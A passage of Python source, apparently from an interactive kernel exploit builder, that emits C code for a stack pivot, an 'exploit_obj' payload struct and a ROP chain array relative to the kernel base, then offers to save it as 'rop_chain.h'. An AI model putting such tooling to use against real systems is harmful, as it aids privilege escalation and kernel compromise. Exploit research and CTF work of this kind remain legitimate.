    c_lines.append(pivot_to_c_comment(pivot, kern_base))
    c_lines.append(payload_to_c_struct(payload, chain, pivot, symbol_map,
                                       "exploit_obj", kern_base,
                                       used_dispatch=all_occupied,
                                       shift_info=shift_info))
    if is_indirect:
        c_lines.append("")
        poff = getattr(pivot.pivot_gadget, 'pivot_offset', 0) if \
            pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push') else 0
        c_lines.append(ropchain_to_c_array(chain, symbol_map, "rop_chain",
                                           kern_base, pivot_offset=poff))
    c_output = "\n".join(c_lines) + "\n"

    print("\n=== Generated C code ===\n")
    print(c_output)

    # Optional save
    if prompt_yn("Save to file?", default=False):
        filename = prompt_string("Filename", "rop_chain.h")
        with open(filename, 'w') as f:
            f.write(c_output)
        print("Saved to {}.".format(filename))
